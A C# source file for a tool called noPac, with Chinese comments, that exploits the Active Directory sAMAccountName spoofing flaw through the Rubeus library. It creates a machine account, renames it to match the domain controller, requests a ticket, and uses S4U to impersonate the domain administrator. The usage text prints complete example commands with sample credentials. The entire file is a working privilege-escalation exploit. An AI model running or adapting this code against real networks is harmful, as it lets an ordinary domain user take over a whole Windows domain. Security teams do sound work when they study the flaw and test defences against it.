using Rubeus;
using System;
using System.Collections.Generic;
using System.DirectoryServices;
using System.DirectoryServices.ActiveDirectory;
using System.DirectoryServices.Protocols;
using System.Linq;
using System.Net;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Text;

namespace noPac
{
    internal class Program
    {
        /// <summary>
        /// 获取 MachineAccountQuota 的值
        /// </summary>
        /// <param name="domainController">域控</param>
        /// <param name="credential">域用户的认证信息</param>
        /// <returns>MachineAccountQuota 的值</returns>
        public static int GetMachineAccountQuota(string domainController, NetworkCredential credential)
        {
            string attributeResult = string.Empty;
            DirectoryEntry directoryEntry = new DirectoryEntry(String.Concat("LDAP://", domainController), credential.UserName, credential.Password);

            DirectorySearcher directorySearcher = new DirectorySearcher(directoryEntry);
            directorySearcher.Filter = "(" + "ms-ds-machineaccountquota" + "=*)";

            SearchResultCollection searchResultCollection = directorySearcher.FindAll();
            foreach (SearchResult sr in searchResultCollection)
            {
                DirectoryEntry mde = sr.GetDirectoryEntry();
                ResultPropertyCollection omProps = sr.Properties;
                attributeResult = omProps["ms-ds-machineaccountquota"][0].ToString();
            }

            return int.Parse(attributeResult);
        }
        /// <summary>
        /// 获取 distinguishedName
        /// </summary>
        /// <param name="node">MachineAccount</param>
        /// <param name="container">默认传入 Computers 类, 不需要管</param>
        /// <param name="distinguishedName">获取 distinguishedName, 结果为: CN=test1a,CN=Computers,DC=missyou,DC=com</param>
        /// <param name="domain">域信息</param>
        /// <param name="verbose">默认传入为 True, 不需要管</param>
        /// <returns>返回 distinguishedName, 结果为: CN=test1a,CN=Computers,DC=missyou,DC=com</returns>
        public static string GetMAQDistinguishedName(string node, string container, string distinguishedName, string domain, bool verbose)
        {
            string[] domainComponent;

            switch (container)
            {

                case "BUILTIN":
                    container = "CN=Builtin";
                    break;

                case "COMPUTERS":
                    container = "CN=Computers";
                    break;

                case "DOMAINCONTROLLERS":
                    container = "OU=Domain Controllers";
                    break;

                case "FOREIGNSECURITYPRINCIPALS":
                    container = "CN=ForeignSecurityPrincipals";
                    break;

                case "KEYS":
                    container = "CN=Keys";
                    break;

                case "LOSTANDFOUND":
                    container = "CN=LostAndFound";
                    break;

                case "MANAGEDSERVICEACCOUNTS":
                    container = "CN=Managed Service Accounts";
                    break;

                case "PROGRAMDATA":
                    container = "CN=Program Data";
                    break;

                case "USERS":
                    container = "CN=Users";
                    break;

                case "ROOT":
                    container = "";
                    break;

            }

            if (string.IsNullOrEmpty(distinguishedName))
            {

                if (!String.IsNullOrEmpty(container))
                {

                    if (!String.IsNullOrEmpty(node))
                    {
                        distinguishedName = String.Concat("CN=", node, ",", container);
                    }
                    else
                    {
                        distinguishedName = container;
                    }

                }

                domainComponent = domain.Split('.');

                foreach (string dc in domainComponent)
                {
                    distinguishedName += String.Concat(",DC=", dc);
                }

                distinguishedName = distinguishedName.TrimStart(',');

                if (verbose) { Console.WriteLine("[+] Distinguished Name = {0}", distinguishedName); };
            }
            else if (!String.IsNullOrEmpty(node))
            {
                distinguishedName = String.Concat("DC=", node, ",", distinguishedName);
            }

            return distinguishedName;
        }

        /// <summary>
        /// 添加 MachineAccount
        /// </summary>
        /// <param name="container">默认传入 Computer 类, 不需要管</param>
        /// <param name="distinguishedName">distinguishedName, 为: CN=test1a,CN=Computers,DC=missyou,DC=com</param>
        /// <param name="domain">域信息</param>
        /// <param name="domainController">域控</param>
        /// <param name="machineAccount">计算机帐户</param>
        /// <param name="machinePassword">计算机帐户的密码</param>
        /// <param name="verbose">默认为 True, 不需要管</param>
        /// <param name="random">是否随机, 默认为 false, 不随机</param>
        /// <param name="credential">域用户的认证信息</param>
        public static void NewMachineAccount(string container, string distinguishedName, string domain, string domainController, string machineAccount, string machinePassword, bool verbose, bool random, NetworkCredential credential)
        {
            string samAccountName;

            if (machineAccount.EndsWith("$"))
            {
                samAccountName = machineAccount;
                machineAccount = machineAccount.Substring(0, machineAccount.Length - 1);
            }
            else
            {
                samAccountName = String.Concat(machineAccount, "$");
            }

            byte[] unicodePwd;
            string randomPassword = "";

            if (random) //默认传入就是 false，所以不会走这里
            {
                Console.WriteLine("[*] Generating random machine account password");
                RNGCryptoServiceProvider cryptoServiceProvider = new RNGCryptoServiceProvider();
                byte[] randomBuffer = new byte[16];
                cryptoServiceProvider.GetBytes(randomBuffer);
                machinePassword = Convert.ToBase64String(randomBuffer);
            }

            domain = domain.ToLower();
            //dnsHostname = test1a.missyou.com
            string dnsHostname = String.Concat(machineAccount, ".", domain);
            
            //添加计算机帐户的默认 4 个 SPN
            string[] servicePrincipalName = { String.Concat("HOST/", dnsHostname), String.Concat("RestrictedKrbHost/", dnsHostname), String.Concat("HOST/", machineAccount), String.Concat("RestrictedKrbHost/", machineAccount) };
            unicodePwd = Encoding.Unicode.GetBytes(String.Concat('"', machinePassword, '"'));
            distinguishedName = GetMAQDistinguishedName(machineAccount, container, distinguishedName, domain, verbose);
            LdapDirectoryIdentifier identifier = new LdapDirectoryIdentifier(domainController, 389);
            LdapConnection connection = new LdapConnection(identifier);

            if (!String.IsNullOrEmpty(credential.UserName))
            {
                connection = new LdapConnection(identifier, credential);
            }

            try
            {
                connection.SessionOptions.Sealing = true;
                connection.SessionOptions.Signing = true;
                connection.Bind();
                AddRequest request = new AddRequest();
                request.DistinguishedName = distinguishedName;
                request.Attributes.Add(new DirectoryAttribute("objectClass", "Computer"));
                request.Attributes.Add(new DirectoryAttribute("sAMAccountName", samAccountName));
                request.Attributes.Add(new DirectoryAttribute("userAccountControl", "4096"));
                request.Attributes.Add(new DirectoryAttribute("dNSHostName", dnsHostname));
                request.Attributes.Add(new DirectoryAttribute("servicePrincipalName", servicePrincipalName));
                request.Attributes.Add(new DirectoryAttribute("unicodePwd", unicodePwd));
                connection.SendRequest(request);
                connection.Dispose();

                if (random) //不会出现随机，因为 agrRandom 默认就是 false
                {
                    Console.WriteLine("[+] Machine account {0} added with password {1}", machineAccount, randomPassword);
                }
                else
                {
                    Console.WriteLine("[+] Machine account {0} added", machineAccount);
                }

            }
            catch (Exception ex)
            {

                if (ex.Message.Contains("The object exists."))
                {
                    Console.WriteLine("[!] Machine account {0} already exists", machineAccount);
                }
                else if (ex.Message.Contains("The server cannot handle directory requests."))
                {
                    Console.WriteLine("[!] User may have reached ms-DS-MachineAccountQuota limit");
                }

                Console.WriteLine(ex.ToString());
                connection.Dispose();
                throw;
            }

        }

        /// <summary>
        /// 设置添加的 MachineAccount 属性
        /// </summary>
        /// <param name="container">默认传入 Computer 类, 不需要管</param>
        /// <param name="distinguishedName">distinguishedName, 为: CN=test1a,CN=Computers,DC=missyou,DC=com</param>
        /// <param name="domain">域信息</param>
        /// <param name="domainController">域控</param>
        /// <param name="attribute">计算机帐户的属性</param>
        /// <param name="machineAccount">计算机账户</param>
        /// <param name="value">默认传入为空, 不需要管</param>
        /// <param name="append">传入为 False, 是否添加属性</param>
        /// <param name="clear">传入为 True, 清除属性</param>
        /// <param name="verbose">默认为 True, 不需要管</param>
        /// <param name="credential">域用户的认证信息</param>
        public static void SetMachineAccountAttribute(string container, string distinguishedName, string domain, string domainController, string attribute, string machineAccount, string value, bool append, bool clear, bool verbose, NetworkCredential credential)
        {
            //添加计算机帐户 $ 结尾的判断处理
            if (machineAccount.EndsWith("$"))
            {
                machineAccount = machineAccount.Substring(0, machineAccount.Length - 1);
            }
            else
            {
                machineAccount = machineAccount;
            }

            distinguishedName = GetMAQDistinguishedName(machineAccount, container, distinguishedName, domain, false);

            if (attribute.Equals("msDS-AllowedToActOnBehalfOfOtherIdentity"))  //不会走这里，这个是 rbcd 的属性
            {
                RawSecurityDescriptor rawSecurityDescriptor = new RawSecurityDescriptor("O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;" + value + ")");
                byte[] descriptor = new byte[rawSecurityDescriptor.BinaryLength];
                rawSecurityDescriptor.GetBinaryForm(descriptor, 0);
            }

            DirectoryEntry directoryEntry;

            if (!String.IsNullOrEmpty(credential.UserName))
            {
                directoryEntry = new DirectoryEntry(String.Concat("LDAP://", domainController, "/", distinguishedName), credential.UserName, credential.Password);
            }
            else
            {
                directoryEntry = new DirectoryEntry(String.Concat("LDAP://", domainController, "/", distinguishedName));
            }

            try
            {

                if (append)
                {
                    directoryEntry.Properties[attribute].Add(value);
                    directoryEntry.CommitChanges();
                    Console.WriteLine("[+] Machine account {0} attribute {1} appended", machineAccount, attribute);
                }
                else if (clear)
                {
                    directoryEntry.Properties[attribute].Clear();
                    directoryEntry.CommitChanges();
                    Console.WriteLine("[+] Machine account {0} attribute {1} cleared", machineAccount, attribute);
                }
                else
                {
                    directoryEntry.InvokeSet(attribute, value);
                    directoryEntry.CommitChanges();
                    Console.WriteLine("[+] Machine account {0} attribute {1} updated", machineAccount, attribute);
                }

            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
                throw;
            }

            if (!String.IsNullOrEmpty(directoryEntry.Path))
            {
                directoryEntry.Dispose();
            }

        }
        
        static void Main(string[] args)
        {
            string argDomainUser = "";
            string argDomainUserPassword = "";

            string argContainer = "COMPUTERS";
            string argDistinguishedName = "";
            string argDomain = "";
            string argDomainController = "";
            string argTargetSPN = "";
            string argService = "LDAP";
            string argImpersonate = "administrator";
            bool argPTT = false;

            //machine account
            string argMachineAccount = "";
            string argMachinePassword = "";

            bool argRandom = false;
            bool argVerbose = true;
            Rubeus.lib.Interop.LUID luid = new Rubeus.lib.Interop.LUID();

            if (args == null || !args.Any())
            {
                Console.WriteLine();
                Console.WriteLine("Examples: Get TGT and ST");
                Console.WriteLine();
                Console.WriteLine("  noPac.exe /domain DomainName /dc DomainController /mAccount MachineAccount /mPassword MachineAccountPassword /user DomainUser /pass DomainUserPassword");
                Console.WriteLine();
                Console.WriteLine("  noPac.exe /domain missyou.com /dc dc.missyou.com /mAccount test1b$ /mPassword \"TesT1b13!#@\" /user wanglei /pass wanglei");
                Console.WriteLine();
                Console.WriteLine("  noPac.exe /domain DomainName /dc DomainController /mAccount MachineAccount /mPassword MachineAccountPassword /user DomainUser /pass DomainUserPassword /service altservice");
                Console.WriteLine();
                Console.WriteLine("  noPac.exe /domain missyou.com /dc dc.missyou.com /mAccount test1b$ /mPassword \"TesT1b13!#@\" /user wanglei /pass wanglei /service cifs");
                Console.WriteLine();
                Console.WriteLine("Examples: PTT");
                Console.WriteLine();
                Console.WriteLine("  noPac.exe /domain DomainName /dc DomainController /mAccount MachineAccount /mPassword MachineAccountPassword /user DomainUser /pass DomainUserPassword /service altservice /ptt");
                Console.WriteLine();
                Console.WriteLine("  noPac.exe /domain missyou.com /dc dc.missyou.com /mAccount test1b$ /mPassword \"TesT1b13!#@\" /user wanglei /pass wanglei /service cifs /ptt");
                Console.WriteLine();
                Console.WriteLine("  noPac.exe /domain missyou.com /dc dc.missyou.com /mAccount test1b /mPassword \"TesT1b13!#@\" /user wanglei /pass wanglei /service cifs /ptt");
                
                return;
            }

            foreach (var entry in args.Select((value, index) => new { index, value }))
            {
                string argument = entry.value.ToUpper();

                switch (argument)
                {
                    case "-DOMAIN":
                    case "/DOMAIN":
                        argDomain = args[entry.index + 1];
                        break;

                    case "-USER":
                    case "/USER":
                        argDomainUser = args[entry.index + 1];
                        break;

                    case "-PASS":
                    case "/PASS":
                        argDomainUserPassword = args[entry.index + 1];
                        break;
                    case "-DC":
                    case "/DC":
                        argDomainController = args[entry.index + 1];
                        break;
                    case "-MACCOUNT":
                    case "/MACCOUNT":
                        argMachineAccount = args[entry.index + 1];
                        break;
                    case "-MPASSWORD":
                    case "/MPASSWORD":
                        argMachinePassword = args[entry.index + 1];
                        break;
                    case "-SERVICE":
                    case "/SERVICE":
                        argService = args[entry.index + 1];
                        break;
                    case "-IMPERSONATE":
                    case "/IMPERSONATE":
                        argImpersonate = args[entry.index + 1];
                        break;
                    case "-PTT":
                    case "/PTT":
                        argPTT = true;
                        break;
                }
            }
            NetworkCredential credential = new NetworkCredential(argDomainUser, argDomainUserPassword, argDomain);
            string machineAccountPasswordHash = Crypto.KerberosPasswordHash(Interop.KERB_ETYPE.rc4_hmac, argMachinePassword);
            string domainUserPasswordHash = Crypto.KerberosPasswordHash(Interop.KERB_ETYPE.rc4_hmac, argDomainUserPassword);

            //判断 MachineAccountQuota 是否为 0, 如果为 0 则退出程序
            int getMachineAccountQuota = GetMachineAccountQuota(argDomainController,credential);
            if (getMachineAccountQuota == 0)
            {
                Console.WriteLine();
                Console.WriteLine("MachineAccountQuota = 0, Unable to create machine account, please try another exploit!");
                Environment.Exit(0);
            }
            else if (getMachineAccountQuota > 0)  //如果 MachineAccountQuota != 0, 则尝试进行利用
            {
                Console.WriteLine();
                Console.WriteLine("[+] MachineAccountQuota = {0}, Try to add machine account for exploit!", getMachineAccountQuota);

                if (args.Length >= 1)
                {
                    argTargetSPN = $"{argService}/{argDomainController}";
                }

                //new machine account
                try
                {
                    NewMachineAccount(argContainer, argDistinguishedName, argDomain, argDomainController, argMachineAccount, argMachinePassword, argVerbose, argRandom, credential);
                }
                catch (DirectoryOperationException e)
                {
                    //so we can rerun the tool using the same machine account or reuse machine account
                    if (!e.Message.Contains("The object exists"))
                    {
                        Console.WriteLine("[-] Failed to create machine account");
                        return;
                    }
                }

                //clean spn
                SetMachineAccountAttribute(argContainer, argDistinguishedName, argDomain, argDomainController, "serviceprincipalname", argMachineAccount, "", false, true, argVerbose, credential);

                //set samaccountname
                SetMachineAccountAttribute(argContainer, argDistinguishedName, argDomain, argDomainController, "samaccountname", argMachineAccount, argDomainController.Split('.')[0], false, false, argVerbose, credential);

                //ask tgt
                byte[] ticket = Ask.TGT(argDomainController.Split('.')[0], argDomain, machineAccountPasswordHash, Interop.KERB_ETYPE.rc4_hmac, "", false, argDomainController, luid, false, false, "", false, true);
                if (ticket.Length > 0)
                {
                    Console.WriteLine("[+] Got TGT for {0}", argDomainController);
                    Console.WriteLine("[*] base64(ticket.kirbi):\r\n");
                    string kirbiString = Convert.ToBase64String(ticket);
                    Console.WriteLine("      {0}", kirbiString);
                    Console.WriteLine("");
                }
                else
                {
                    Console.WriteLine("[-] Could not get TGT for {0}", argDomainController);
                    return;
                }

                //undo samaccountname change
                SetMachineAccountAttribute(argContainer, argDistinguishedName, argDomain, argDomainController, "samaccountname", argMachineAccount, argMachineAccount, false, false, argVerbose, credential);

                //s4u
                KRB_CRED kirbi = new KRB_CRED(ticket);
                S4U.Execute(kirbi, argImpersonate, "", "", argPTT, argDomainController, argTargetSPN, null, "", "", true, false, false, machineAccountPasswordHash, Interop.KERB_ETYPE.rc4_hmac, argDomain, "");
            }

        }
    }
}
